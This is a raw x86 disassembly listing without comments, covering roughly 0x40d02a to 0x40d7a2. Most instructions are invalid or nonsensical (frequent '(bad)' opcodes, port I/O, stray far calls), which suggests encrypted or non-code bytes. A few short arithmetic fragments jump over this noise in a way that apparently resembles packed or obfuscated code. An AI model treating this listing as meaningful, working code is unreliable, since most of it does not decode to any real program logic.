  40d02a:	ds xchg esi,eax
  40d02c:	jne    0x40d07f
  40d02e:	outs   dx,BYTE PTR ds:[esi]
  40d02f:	int    0xd0
  40d031:	jb     0x40d0a9
  40d033:	push   ebp
  40d034:	mov    eax,ds:0xa4bf6a10
  40d039:	out    0x1c,eax
  40d03b:	mov    bh,0x6e
  40d03d:	ret    0xd2d9
  40d040:	jo     0x40d06d
  40d042:	jno    0x40cfdc
  40d044:	rcr    BYTE PTR [edx],cl
  40d046:	repnz add BYTE PTR [ecx+0x77],0xae
  40d04b:	mov    esp,0xf442db2
  40d050:	(bad)  
  40d051:	or     cl,ah
  40d053:	cmp    ebp,DWORD PTR [ebp-0x1bd0b744]
  40d059:	mov    cs,ebx
  40d05b:	test   al,0x8b
  40d05d:	add    ebx,DWORD PTR [ebp-0x2a]
  40d060:	add    esp,DWORD PTR es:[ebp+0x42299623]
  40d067:	dec    esp
  40d068:	or     DWORD PTR [eax],esi
  40d06a:	push   0x6
  40d06c:	fstp   QWORD PTR [esi+0x55]
  40d06f:	mov    ds:0x9ac82423,al
  40d074:	dec    eax
  40d075:	in     al,0x2f
  40d077:	xchg   ebx,eax
  40d078:	int    0x87
  40d07a:	fsubr  DWORD PTR [esi+0x4f]
  40d07d:	xchg   esp,eax
  40d07e:	jnp    0x40d087
  40d080:	out    dx,al
  40d081:	aam    0x7a
  40d083:	jo     0x40d0bf
  40d085:	jno    0x40d05a
  40d087:	push   esp
  40d088:	icebp  
  40d089:	inc    ebx
  40d08a:	jmp    0x40d05b
  40d08c:	pusha  
  40d08d:	pop    edi
  40d08e:	shr    BYTE PTR [eax],0x8c
  40d091:	adc    esp,esp
  40d093:	daa    
  40d094:	sti    
  40d095:	mov    esi,0xa4584985
  40d09a:	mov    ds,WORD PTR [ebp+0x4b24a97a]
  40d0a0:	sub    eax,0x63b64f9d
  40d0a5:	jp     0x40d11a
  40d0a7:	dec    DWORD PTR [edi+0x42]
  40d0aa:	and    al,0xa6
  40d0ac:	nop
  40d0ad:	cwde   
  40d0ae:	jge    0x40d06d
  40d0b0:	(bad)  
  40d0b2:	xchg   BYTE PTR [edx],dl
  40d0b4:	add    eax,0xa78f3d91
  40d0b9:	xchg   ecx,eax
  40d0ba:	push   es
  40d0bb:	jno    0x40d123
  40d0bd:	ret    
  40d0be:	(bad)  
  40d0bf:	jnp    0x40d0dc
  40d0c1:	pop    es
  40d0c2:	dec    esi
  40d0c3:	jnp    0x40d0d9
  40d0c5:	sbb    al,0xfa
  40d0c7:	pop    edi
  40d0c8:	aad    0x6f
  40d0ca:	mov    esp,0xfd91955d
  40d0cf:	out    0x4c,al
  40d0d1:	sar    BYTE PTR [ecx+0x52],0x43
  40d0d5:	idiv   BYTE PTR [edi]
  40d0d7:	push   eax
  40d0d8:	push   0x51
  40d0da:	aam    0x1d
  40d0dc:	fisub  DWORD PTR [ebx+0x36bc7e50]
  40d0e2:	inc    ebp
  40d0e3:	loopne 0x40d092
  40d0e5:	push   edi
  40d0e6:	cmp    ebx,ecx
  40d0e8:	add    bl,BYTE PTR [ecx+eax*2+0x4434809]
  40d0ef:	and    eax,0xe3d79298
  40d0f4:	dec    eax
  40d0f5:	sbb    dl,BYTE PTR [ebp+ebx*8-0x6b5d1d72]
  40d0fc:	loop   0x40d0ba
  40d0fe:	xlat   BYTE PTR ds:[ebx]
  40d0ff:	nop
  40d100:	enter  0x75e1,0xba
  40d104:	jnp    0x40d0d9
  40d106:	xchg   ecx,eax
  40d107:	call   0x44c36a19
  40d10c:	mov    ds:0xe3848349,eax
  40d111:	popa   
  40d112:	inc    esi
  40d113:	jne    0x40d09f
  40d115:	xor    BYTE PTR [esi],0xc9
  40d118:	(bad)  
  40d119:	xchg   ecx,eax
  40d11a:	xchg   esi,eax
  40d11b:	xor    bl,cl
  40d11d:	mov    bh,0xe
  40d11f:	mov    BYTE PTR [ebp+0x70],ah
  40d122:	sbb    edi,DWORD PTR [ebp-0x61]
  40d125:	mov    edi,0xd3c47140
  40d12a:	aad    0x61
  40d12c:	dec    esp
  40d12d:	enter  0xd5c,0xbb
  40d131:	(bad)  
  40d132:	mov    dl,0xa8
  40d134:	push   ebx
  40d135:	pop    esi
  40d136:	rol    DWORD PTR [eax],cl
  40d138:	pushf  
  40d139:	inc    esi
  40d13a:	jns    0x40d0d5
  40d13c:	add    al,0x78
  40d13e:	xchg   BYTE PTR [ebx-0x5d],ah
  40d141:	push   0x1b
  40d143:	mov    ds:0x46e3e6f7,al
  40d148:	pushf  
  40d149:	lods   al,BYTE PTR ds:[esi]
  40d14a:	out    0xea,al
  40d14c:	cmp    bl,dh
  40d14e:	cmp    dl,BYTE PTR ds:0x45817e6e
  40d154:	shl    ebx,1
  40d156:	add    eax,DWORD PTR [esi-0x30]
  40d159:	and    esp,edi
  40d15b:	sbb    dh,BYTE PTR [esi]
  40d15d:	mov    esi,0x232eabf0
  40d162:	jno    0x40d176
  40d164:	or     al,0xc0
  40d166:	xchg   DWORD PTR [eax],ebx
  40d168:	in     al,0x66
  40d16a:	fdiv   DWORD PTR [edi+0x3f87d41a]
  40d170:	cdq    
  40d171:	out    0x98,eax
  40d173:	call   0xdcccdca0
  40d178:	retf   0x8bcd
  40d17b:	adc    dh,BYTE PTR ds:0x765ba226
  40d181:	cs pop ds
  40d183:	and    DWORD PTR [ecx-0x10],ebx
  40d186:	or     BYTE PTR [edx],dl
  40d188:	mov    dl,0xd6
  40d18a:	sbb    eax,0xa1da1e23
  40d18f:	outs   dx,BYTE PTR ds:[esi]
  40d190:	pop    edx
  40d191:	sbb    DWORD PTR [esi-0x17dcad1b],ecx
  40d197:	mov    eax,0xe76c0423
  40d19c:	or     al,0xec
  40d19e:	repnz pop esi
  40d1a0:	ja     0x40d1a0
  40d1a2:	cmp    BYTE PTR [edx+eax*8+0x22],al
  40d1a6:	sti    
  40d1a7:	sub    edx,DWORD PTR [ebx]
  40d1a9:	fstp   TBYTE PTR [eax]
  40d1ab:	sbb    DWORD PTR [eax],0x84e0bb9c
  40d1b1:	push   es
  40d1b2:	dec    edx
  40d1b3:	mov    ds:0xe196c6a3,eax
  40d1b8:	out    dx,al
  40d1b9:	mov    esi,0xb5c78ad0
  40d1be:	sar    dl,cl
  40d1c0:	push   ecx
  40d1c1:	nop
  40d1c2:	dec    BYTE PTR [eax+ebx*8-0x3509bfe9]
  40d1c9:	nop
  40d1ca:	bound  eax,QWORD PTR [esi-0x4b1ac80c]
  40d1d0:	out    dx,al
  40d1d1:	push   ebx
  40d1d2:	add    eax,0x90b3a7c4
  40d1d7:	jl     0x40d1aa
  40d1d9:	push   ecx
  40d1da:	clc    
  40d1db:	loope  0x40d1f1
  40d1dd:	dec    esp
  40d1de:	(bad)  
  40d1df:	xor    edx,eax
  40d1e1:	add    edx,ecx
  40d1e3:	imul   edx,edi
  40d1e6:	mov    edi,DWORD PTR [ebp-0xc]
  40d1e9:	xor    edi,eax
  40d1eb:	sub    edx,edi
  40d1ed:	mov    edi,DWORD PTR [ebp-0xc]
  40d1f0:	mov    ebx,DWORD PTR [ebp-0x14]
  40d1f3:	xor    edi,eax
  40d1f5:	add    edi,ecx
  40d1f7:	imul   edi,ebx
  40d1fa:	mov    ebx,DWORD PTR [ebp-0x18]
  40d1fd:	jmp    0x40d614
  40d202:	pop    esi
  40d203:	in     al,0x48
  40d205:	add    BYTE PTR [esp+edi*4+0x76],dl
  40d209:	ins    BYTE PTR es:[edi],dx
  40d20a:	xor    edx,DWORD PTR [ecx]
  40d20c:	fcmovb st,st(2)
  40d20e:	stc    
  40d20f:	lea    edi,[si-0x3a]
  40d213:	call   0x7e7e:0x79707e7e
  40d21a:	mov    ds:0x859573a8,eax
  40d21f:	cmp    al,0xd
  40d221:	ror    DWORD PTR [eax],1
  40d223:	in     eax,dx
  40d224:	sar    bh,1
  40d226:	sub    bl,BYTE PTR [edx+0x3e]
  40d229:	popf   
  40d22a:	pop    ebx
  40d22b:	jae    0x40d208
  40d22d:	mov    ah,0x72
  40d22f:	retf   
  40d230:	out    0xf3,eax
  40d232:	test   bh,bl
  40d234:	jecxz  0x40d210
  40d236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d237:	repz mov al,0x8
  40d23a:	mov    esi,0xfa50e1f1
  40d23f:	mov    ecx,DWORD PTR [eax]
  40d241:	scas   eax,DWORD PTR es:[edi]
  40d242:	nop    DWORD PTR [edi+0x1912a518]
  40d249:	icebp  
  40d24a:	nop
  40d24b:	daa    
  40d24c:	aaa    
  40d24d:	push   edi
  40d24e:	mov    ecx,0xf46d5a1a
  40d253:	cli    
  40d254:	loopne 0x40d26d
  40d256:	dec    esi
  40d257:	std    
  40d258:	xor    bl,BYTE PTR [eax]
  40d25a:	das    
  40d25b:	fist   DWORD PTR ds:0xa1c6c23a
  40d261:	pop    es
  40d262:	sbb    al,0x94
  40d264:	jp     0x40d2ba
  40d266:	cmp    DWORD PTR [edx+ecx*2-0x3d758b0c],0x1087078c
  40d271:	push   edi
  40d272:	sbb    edi,DWORD PTR [ebp+0x3c1c7179]
  40d278:	and    esi,DWORD PTR [edx-0x5b]
  40d27b:	mov    BYTE PTR ds:0x71830249,ah
  40d281:	push   es
  40d282:	jb     0x40d267
  40d284:	pop    ecx
  40d285:	pop    ds
  40d286:	add    edx,DWORD PTR [edx+0x54]
  40d289:	jae    0x40d2d8
  40d28b:	dec    ebp
  40d28c:	mov    ch,0x8
  40d28e:	ds int3 
  40d290:	rcr    DWORD PTR [ebp-0x62],0x79
  40d294:	adc    bh,BYTE PTR [ebx+0x703e6c46]
  40d29a:	jle    0x40d2b2
  40d29c:	jbe    0x40d311
  40d29e:	lahf   
  40d29f:	jge    0x40d2a8
  40d2a1:	imul   esi,edx,0x1a
  40d2a4:	cmp    DWORD PTR [ebp+0x65],ecx
  40d2a7:	mov    edx,0x24a031a9
  40d2ac:	jnp    0x40d236
  40d2ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2af:	addr16 xor al,0x5b
  40d2b2:	out    0x3,eax
  40d2b4:	xchg   ebp,eax
  40d2b5:	fimul  DWORD PTR [ebp-0x77]
  40d2b8:	stc    
  40d2b9:	mov    al,ds:0x661e5472
  40d2be:	cli    
  40d2bf:	adc    ah,dh
  40d2c1:	and    ch,BYTE PTR [edi-0x14e4a91]
  40d2c7:	fldenv [esi+0x1a]
  40d2ca:	jns    0x40d284
  40d2cc:	imul   edx,DWORD PTR [edi],0xd6debc2c
  40d2d2:	clc    
  40d2d3:	push   edi
  40d2d4:	mov    dh,BYTE PTR [edx]
  40d2d6:	xor    DWORD PTR ds:[edi-0x4cb31a48],0x16
  40d2de:	sbb    DWORD PTR [edx],esp
  40d2e0:	(bad)  
  40d2e1:	jle    0x40d278
  40d2e3:	or     ch,BYTE PTR [edx+0x3907b4fe]
  40d2e9:	test   DWORD PTR [esi-0x1],0x27a27e5c
  40d2f0:	adc    BYTE PTR [edi-0x2810938],0x1b
  40d2f7:	dec    ebp
  40d2f8:	mov    dh,0xcf
  40d2fa:	xor    eax,0x345e612a
  40d2ff:	and    eax,0x5f5edef8
  40d304:	pop    edi
  40d305:	enter  0x43e2,0x4f
  40d309:	adc    ch,BYTE PTR [ebx-0x7d]
  40d30c:	inc    esi
  40d30d:	jmp    0x40d35d
  40d30f:	dec    ebp
  40d310:	push   ds
  40d311:	adc    ebp,DWORD PTR [ebx-0x1f]
  40d314:	xchg   ebp,eax
  40d315:	aad    0xc8
  40d317:	int    0x1c
  40d319:	retf   
  40d31a:	arpl   WORD PTR [eax+0x117efa8b],bx
  40d320:	in     al,dx
  40d321:	mov    ch,ah
  40d323:	mov    WORD PTR [ebp-0x5f3cd48c],gs
  40d329:	iret   
  40d32a:	int3   
  40d32b:	jo     0x40d34d
  40d32d:	push   esi
  40d32e:	xchg   edi,eax
  40d32f:	push   cs
  40d330:	mov    esp,0x77b0fd15
  40d335:	jmp    0x40d3a0
  40d337:	sub    esp,0xffffffb7
  40d33a:	cli    
  40d33b:	out    0xad,eax
  40d33d:	adc    bh,0xd
  40d340:	mov    DWORD PTR [esi],esi
  40d342:	mov    BYTE PTR [ecx],dh
  40d344:	pop    ebx
  40d345:	repz or ch,BYTE PTR [esi+esi*8]
  40d349:	dec    ebp
  40d34a:	das    
  40d34b:	out    0xf6,al
  40d34d:	in     al,0x19
  40d34f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d350:	cwde   
  40d351:	(bad)  
  40d352:	mov    ebx,0x4ee0c86b
  40d357:	in     al,0x2a
  40d359:	lods   eax,DWORD PTR ds:[esi]
  40d35a:	adc    dl,BYTE PTR [eax+0x7367b636]
  40d360:	mov    edi,0xc5607e79
  40d365:	push   ecx
  40d366:	into   
  40d367:	out    dx,eax
  40d368:	shr    DWORD PTR [edx+0x2e],cl
  40d36b:	fdiv   QWORD PTR [edi]
  40d36d:	aam    0xb1
  40d36f:	mov    ebx,cs
  40d371:	push   esp
  40d372:	inc    ebx
  40d373:	repnz mov DWORD PTR [ebx+ebx*1+0x64caf71e],ebp
  40d37b:	adc    DWORD PTR [edi+0x7d],esi
  40d37e:	mov    al,ds:0xba42a3a5
  40d383:	mov    dl,0x9
  40d385:	js     0x40d39e
  40d387:	scas   eax,DWORD PTR es:[edi]
  40d388:	sub    bl,dl
  40d38a:	pop    es
  40d38b:	(bad)  
  40d38c:	sbb    DWORD PTR [eax-0x2b],edi
  40d38f:	repnz xchg esp,eax
  40d391:	in     eax,0x49
  40d393:	stc    
  40d394:	push   ecx
  40d395:	mov    al,0x2f
  40d397:	ins    BYTE PTR es:[edi],dx
  40d398:	outs   dx,DWORD PTR ds:[esi]
  40d399:	fcomi  st,st(1)
  40d39b:	sub    BYTE PTR [ebx],al
  40d39d:	mov    bl,BYTE PTR [edi-0x1fdbdcc7]
  40d3a3:	xchg   edi,eax
  40d3a4:	mov    eax,0x871589fe
  40d3a9:	or     ebx,eax
  40d3ab:	out    dx,al
  40d3ac:	inc    ecx
  40d3ad:	and    eax,0xa3104577
  40d3b2:	adc    ch,BYTE PTR [ebp+0x132fb4ac]
  40d3b8:	xchg   edx,eax
  40d3b9:	dec    esi
  40d3ba:	mov    esi,DWORD PTR ds:0x48e31735
  40d3c0:	inc    edi
  40d3c1:	sbb    al,0xbe
  40d3c3:	rcl    DWORD PTR [edi-0x155f3776],1
  40d3c9:	sbb    BYTE PTR [ebx+ecx*4+0x68],bh
  40d3cd:	jbe    0x40d414
  40d3cf:	jge    0x40d44f
  40d3d1:	cli    
  40d3d2:	add    DWORD PTR [ecx-0x74],edi
  40d3d5:	into   
  40d3d6:	jae    0x40d380
  40d3d8:	jbe    0x40d449
  40d3da:	mov    ds:0x25286ec5,eax
  40d3df:	test   BYTE PTR [edx-0x6f],dl
  40d3e2:	aas    
  40d3e3:	sar    BYTE PTR [eax],1
  40d3e5:	call   0x5309:0xd6ba18c4
  40d3ec:	jg     0x40d426
  40d3ee:	repnz aad 0x87
  40d3f1:	std    
  40d3f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3f3:	ja     0x40d3f3
  40d3f5:	xor    bl,bl
  40d3f7:	addr16 pop esi
  40d3f9:	mov    ecx,0x7b6782d4
  40d3fe:	pop    edi
  40d3ff:	or     BYTE PTR [ecx+0x44],ch
  40d402:	cld    
  40d403:	push   es
  40d404:	dec    esi
  40d405:	xchg   DWORD PTR [eax+0x73],ecx
  40d408:	aaa    
  40d409:	repnz test BYTE PTR [ebx+0x0],al
  40d40d:	push   es
  40d40e:	jg     0x40d3ef
  40d410:	push   esi
  40d411:	dec    esp
  40d412:	fld    TBYTE PTR [ecx+eax*1-0x4bfdeccf]
  40d419:	int3   
  40d41a:	dec    ebp
  40d41b:	fwait
  40d41c:	test   DWORD PTR [edi],ebp
  40d41e:	push   0xa8410c51
  40d423:	mov    ecx,0x73a48b23
  40d428:	mov    ds:0x8dcbadef,al
  40d42d:	popa   
  40d42e:	mov    esp,0xd1a3c6bf
  40d433:	or     eax,0xad507ad9
  40d438:	test   dl,bl
  40d43a:	add    al,0xdf
  40d43c:	sbb    edi,DWORD PTR [ebx-0x19]
  40d43f:	sbb    al,0x16
  40d441:	cld    
  40d442:	xchg   esi,eax
  40d443:	add    BYTE PTR [esi-0x65cce969],ah
  40d449:	test   DWORD PTR [ebx+0xf],esp
  40d44c:	xor    DWORD PTR [edx-0x10516a73],eax
  40d452:	mov    dl,0xd
  40d454:	(bad)  
  40d455:	in     al,0x83
  40d457:	shr    BYTE PTR [ecx+0x34],0x92
  40d45b:	jecxz  0x40d42d
  40d45d:	sar    DWORD PTR [esi],0x4f
  40d460:	fcomp  QWORD PTR [edx]
  40d462:	add    eax,0x4212c649
  40d467:	cdq    
  40d468:	mov    ds:0xe90fee4b,eax
  40d46d:	or     edx,0x9481c2ca
  40d473:	in     al,0xad
  40d475:	out    dx,al
  40d476:	nop
  40d477:	or     al,0xb9
  40d479:	mov    eax,0x12a8dc83
  40d47e:	or     esp,esi
  40d480:	mov    esi,0x2cba31b8
  40d485:	scas   al,BYTE PTR es:[edi]
  40d486:	mov    esi,0xb73b9f3e
  40d48b:	sub    BYTE PTR [esp+ebx*8-0x2f],cl
  40d48f:	ret    
  40d490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d491:	retf   0x945a
  40d494:	mov    eax,0x82aac640
  40d499:	or     al,0x3
  40d49b:	fisubr WORD PTR [ebp-0x212e9472]
  40d4a1:	mov    ebp,0xa942976c
  40d4a6:	jae    0x40d502
  40d4a8:	cmp    eax,0x4789121c
  40d4ad:	arpl   WORD PTR [edi],ax
  40d4af:	in     eax,0x42
  40d4b1:	repz mov ebx,0xeb734a84
  40d4b7:	icebp  
  40d4b8:	jmp    0x61c4dc3f
  40d4bd:	ret    0x7ec0
  40d4c0:	pop    eax
  40d4c1:	push   ecx
  40d4c2:	adc    dh,BYTE PTR [edi+0x41c86873]
  40d4c8:	mov    esi,0xfa4202bc
  40d4cd:	imul   ecx,DWORD PTR [edx+ebx*2+0x214cc0d2],0xffffff8f
  40d4d5:	fnstcw WORD PTR [ecx-0x4341fe00]
  40d4db:	js     0x40d4ec
  40d4dd:	ins    DWORD PTR es:[edi],dx
  40d4de:	push   eax
  40d4df:	dec    eax
  40d4e0:	inc    edx
  40d4e1:	rcl    DWORD PTR [edi-0x80],1
  40d4e4:	mov    ch,0xc8
  40d4e6:	test   BYTE PTR [eax-0x4e],al
  40d4e9:	or     DWORD PTR [ebp-0x2b],edx
  40d4ec:	pushf  
  40d4ed:	xor    BYTE PTR [ebp-0x37],dl
  40d4f0:	dec    esp
  40d4f1:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4f3:	lahf   
  40d4f4:	pop    ecx
  40d4f5:	sbb    BYTE PTR [edx-0x1],dl
  40d4f8:	sbb    eax,0x15f93729
  40d4fd:	icebp  
  40d4fe:	jnp    0x40d511
  40d500:	inc    ebp
  40d501:	(bad)  
  40d502:	mov    cs,WORD PTR [eax+eiz*8]
  40d505:	add    edi,esi
  40d507:	(bad)  
  40d508:	push   ds
  40d509:	outs   dx,DWORD PTR ds:[esi]
  40d50a:	jo     0x40d4ca
  40d50c:	jne    0x40d54c
  40d50e:	and    DWORD PTR [ecx+ecx*1+0x22],edi
  40d512:	xchg   edx,eax
  40d513:	shl    BYTE PTR [eax],cl
  40d515:	push   esp
  40d516:	addr16 data16 loopne 0x40d538
  40d51a:	sti    
  40d51b:	jl     0x40d519
  40d51d:	push   esp
  40d51e:	imul   ebp,DWORD PTR [ecx],0xffffffa5
  40d521:	jno    0x40d4b2
  40d523:	dec    esp
  40d524:	lea    edx,[ecx]
  40d526:	in     al,0xf7
  40d528:	fs push esp
  40d52a:	mov    cs,WORD PTR [eax+edi*8-0x16f5aff6]
  40d531:	idiv   BYTE PTR [ebx+0x53f0fb81]
  40d537:	mov    dl,0xd0
  40d539:	inc    edi
  40d53a:	(bad)  
  40d53b:	mov    edi,0xb71345e2
  40d540:	popa   
  40d541:	xchg   edi,eax
  40d542:	jmp    0x40d569
  40d544:	push   0xffffffdc
  40d546:	int    0x61
  40d548:	in     eax,0x66
  40d54a:	loop   0x40d5c1
  40d54c:	outs   dx,BYTE PTR ds:[esi]
  40d54d:	rol    BYTE PTR [edx],1
  40d54f:	xchg   ecx,eax
  40d550:	jo     0x40d58b
  40d552:	loope  0x40d5a7
  40d554:	jns    0x40d52b
  40d556:	xchg   ecx,eax
  40d557:	xlat   BYTE PTR ds:[ebx]
  40d558:	dec    esp
  40d559:	ja     0x40d591
  40d55b:	xchg   DWORD PTR [edx+0x33fe3a8c],eax
  40d561:	mov    esi,0x17b991f3
  40d566:	fcom   QWORD PTR [ecx]
  40d568:	push   eax
  40d569:	lahf   
  40d56a:	jnp    0x40d4fe
  40d56c:	les    edi,FWORD PTR [ecx-0x2c]
  40d56f:	aam    0x59
  40d571:	add    esp,DWORD PTR [ebx-0x15]
  40d574:	dec    ebp
  40d575:	(bad)  
  40d576:	cwde   
  40d577:	popa   
  40d578:	and    esp,DWORD PTR [esi-0x112523aa]
  40d57e:	xor    ecx,ebp
  40d580:	jg     0x40d509
  40d582:	(bad)  
  40d583:	(bad)  
  40d584:	(bad)
  40d588:	cmp    al,0xe0
  40d58a:	lahf   
  40d58b:	daa    
  40d58c:	ja     0x40d514
  40d58e:	test   al,0x6f
  40d590:	repnz das 
  40d592:	push   0xffffffd0
  40d594:	cld    
  40d595:	push   0xffffffde
  40d597:	cmp    eax,0x6d00d13e
  40d59c:	push   edx
  40d59d:	and    bl,cl
  40d59f:	add    DWORD PTR [esi+edi*4],edx
  40d5a2:	inc    esi
  40d5a3:	nop
  40d5a4:	int    0xf6
  40d5a6:	out    0x91,eax
  40d5a8:	(bad)  [esi]
  40d5aa:	bound  ecx,QWORD PTR [esi+0x62d2c0e0]
  40d5b0:	into   
  40d5b1:	push   eax
  40d5b2:	or     bh,ch
  40d5b4:	call   0xbe8d37ea
  40d5b9:	mov    bl,0x37
  40d5bb:	int3   
  40d5bc:	dec    esp
  40d5bd:	mov    ecx,0xfa555773
  40d5c2:	mov    ch,0xf4
  40d5c4:	sbb    al,0x48
  40d5c6:	fidivr WORD PTR [eax+0x7165574e]
  40d5cc:	dec    ecx
  40d5cd:	loopne 0x40d5bb
  40d5cf:	int    0xaf
  40d5d1:	inc    edi
  40d5d2:	sbb    al,0x4f
  40d5d4:	aaa    
  40d5d5:	jl     0x40d655
  40d5d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5d8:	add    eax,0x97cb7ace
  40d5dd:	and    eax,0x6bbf241b
  40d5e2:	jmp    0x40d642
  40d5e4:	(bad)  
  40d5e5:	adc    ebp,DWORD PTR [edi-0x26330425]
  40d5eb:	ins    BYTE PTR es:[edi],dx
  40d5ec:	loopne 0x40d5a7
  40d5ee:	inc    ebx
  40d5ef:	ret    
  40d5f0:	jge    0x40d5b2
  40d5f2:	inc    edx
  40d5f3:	jne    0x40d667
  40d5f5:	sbb    BYTE PTR [edi-0x38],bh
  40d5f8:	and    cl,BYTE PTR [ebx-0x30]
  40d5fb:	aaa    
  40d5fc:	add    ch,BYTE PTR [eax+edi*2+0x40]
  40d600:	jle    0x40d65d
  40d602:	mov    ds:0x959c99e2,eax
  40d607:	lea    ecx,[ecx]
  40d609:	icebp  
  40d60a:	stc    
  40d60b:	vpsubusb ymm1,ymm3,ymm0
  40d60f:	xchg   BYTE PTR [edi+0x33437ffa],cl
  40d615:	fsubr  DWORD PTR [ebx]
  40d617:	ror    DWORD PTR [ebp+0x72991fbc],1
  40d61d:	xor    al,BYTE PTR [eax]
  40d61f:	cmp    edi,edx
  40d621:	jbe    0x40c529
  40d627:	mov    edx,DWORD PTR [ebp-0xc]
  40d62a:	mov    edi,DWORD PTR [ebp-0x24]
  40d62d:	xor    edx,eax
  40d62f:	add    edx,ecx
  40d631:	imul   edx,edi
  40d634:	mov    edi,DWORD PTR [ebp-0x18]
  40d637:	jmp    0x40da4e
  40d63c:	(bad)  
  40d63d:	pusha  
  40d63e:	jecxz  0x40d614
  40d640:	jge    0x40d697
  40d642:	icebp  
  40d643:	ins    BYTE PTR es:[edi],dx
  40d644:	(bad)  
  40d645:	fwait
  40d646:	mov    edi,0x4296b498
  40d64b:	push   esi
  40d64c:	cmp    BYTE PTR [esi+0x79707e7e],ah
  40d652:	jle    0x40d6d2
  40d654:	dec    ebx
  40d655:	pusha  
  40d656:	push   0x78b27e0
  40d65b:	pop    esp
  40d65c:	adc    eax,0x4d09333
  40d661:	out    0xc3,al
  40d663:	test   BYTE PTR [ebx],ch
  40d665:	icebp  
  40d666:	ins    BYTE PTR es:[edi],dx
  40d667:	lds    ebx,FWORD PTR [edi-0x1846a5ab]
  40d66d:	ss aas 
  40d66f:	mov    ebp,0xb25b9628
  40d674:	jmp    0xa3f6:0x1d2b418e
  40d67b:	push   eax
  40d67c:	sub    al,0x1d
  40d67e:	sbb    BYTE PTR [edx-0x19],ch
  40d681:	dec    edi
  40d682:	fsub   DWORD PTR [esi+esi*2]
  40d685:	inc    esi
  40d686:	adc    al,0x6f
  40d688:	(bad)  
  40d689:	push   0x60
  40d68b:	jb     0x40d638
  40d68d:	arpl   WORD PTR [ebp+0x4f82eb31],sp
  40d693:	sub    DWORD PTR [eax],edi
  40d695:	sbb    al,0xda
  40d697:	mov    WORD PTR [esi-0x7e],?
  40d69a:	imul   esp,ebp,0xe68dfd9b
  40d6a0:	retf   
  40d6a1:	push   0xe1ebf2e1
  40d6a6:	jmp    0x40d69a
  40d6a8:	xchg   esp,eax
  40d6a9:	aad    0xcc
  40d6ab:	pusha  
  40d6ac:	not    BYTE PTR [edx+0x52]
  40d6af:	adc    cl,BYTE PTR [ebx+edx*4-0x3fab3223]
  40d6b6:	leave  
  40d6b7:	xchg   ebp,eax
  40d6b8:	jmp    0xa81b6a0c
  40d6bd:	jbe    0x40d732
  40d6bf:	std    
  40d6c0:	es cmp eax,0x11560955
  40d6c6:	in     eax,dx
  40d6c7:	mov    dl,0xee
  40d6c9:	fwait
  40d6ca:	xchg   ecx,eax
  40d6cb:	shr    al,0xa8
  40d6ce:	stos   DWORD PTR es:[edi],eax
  40d6cf:	mov    esp,0x428f98bd
  40d6d4:	push   cs
  40d6d5:	push   ebp
  40d6d6:	test   al,0xa2
  40d6d8:	pop    ecx
  40d6d9:	inc    ebx
  40d6da:	(bad)  
  40d6db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6dc:	cmp    dh,BYTE PTR [ecx-0x598aecaa]
  40d6e2:	add    BYTE PTR [esi],al
  40d6e4:	xor    eax,0x2dff876
  40d6e9:	inc    ecx
  40d6ea:	pop    ss
  40d6eb:	sub    BYTE PTR [edi],0xb5
  40d6ee:	fbld   TBYTE PTR [edi+ebp*1+0x499202c4]
  40d6f5:	es ret 0x3db3
  40d6f9:	or     BYTE PTR [esi-0x78b75d4],bh
  40d6ff:	push   edi
  40d700:	push   edx
  40d701:	lods   al,BYTE PTR ds:[esi]
  40d702:	xchg   ebp,eax
  40d703:	mov    WORD PTR [ebp-0xc],es
  40d706:	and    edi,DWORD PTR [ecx-0x88d40f5]
  40d70c:	popf   
  40d70d:	(bad)  
  40d70e:	or     al,0x7a
  40d710:	sub    eax,0x143ff43d
  40d715:	rcl    dl,1
  40d717:	das    
  40d718:	or     BYTE PTR [edx],dl
  40d71a:	xchg   esi,eax
  40d71b:	ficomp WORD PTR ds:0x2bf323d3
  40d721:	mov    DWORD PTR [esi-0x7ff4a6da],ecx
  40d727:	leave  
  40d728:	sahf   
  40d729:	scas   al,BYTE PTR es:[edi]
  40d72a:	(bad)  
  40d72c:	test   al,0x48
  40d72e:	add    BYTE PTR [ebp-0x3],al
  40d731:	cmp    DWORD PTR [ebx-0x316ee6ac],ebp
  40d737:	je     0x40d7a3
  40d739:	sbb    eax,0x5ea0d872
  40d73e:	imul   edx,DWORD PTR [edi-0x48],0x59
  40d742:	push   esi
  40d743:	add    DWORD PTR [ebx-0x27],edx
  40d746:	push   edx
  40d747:	add    ebp,esp
  40d749:	jnp    0x40d72e
  40d74b:	inc    esp
  40d74c:	pop    ds
  40d74d:	sub    al,0xab
  40d74f:	inc    ebp
  40d750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d751:	call   0xf53e:0x6899423
  40d758:	xchg   edx,eax
  40d759:	push   ebp
  40d75a:	pop    ecx
  40d75b:	inc    ebp
  40d75c:	and    esp,esi
  40d75e:	clc    
  40d75f:	cmp    al,0x2c
  40d761:	jae    0x40d76a
  40d763:	bound  ebp,QWORD PTR [edx]
  40d765:	sub    ebx,DWORD PTR [eax+ebp*8+0x19cba52e]
  40d76c:	mov    dl,0x3a
  40d76e:	clc    
  40d76f:	xchg   ebp,eax
  40d770:	push   eax
  40d771:	pop    ss
  40d772:	mov    ds,WORD PTR [ebx]
  40d774:	pop    ecx
  40d775:	adc    BYTE PTR [edx],dh
  40d777:	outs   dx,BYTE PTR ds:[esi]
  40d778:	loopne 0x40d791
  40d77a:	xor    eax,0x28a2adf1
  40d77f:	enter  0xb797,0x46
  40d783:	add    dl,cl
  40d785:	pop    ds
  40d786:	lock adc al,dl
  40d789:	enter  0xe529,0x5b
  40d78d:	dec    esp
  40d78e:	adc    esi,DWORD PTR [ecx-0x52a32939]
  40d794:	mov    ds:0x7c7b8ce2,eax
  40d799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d79a:	jno    0x40d7e0
  40d79c:	xchg   ebx,eax
  40d79d:	test   BYTE PTR [esi-0x60],0x4d
  40d7a1:	xlat   BYTE PTR ds:[ebx]
  40d7a2:	xlat   BYTE PTR ds:[ebx]
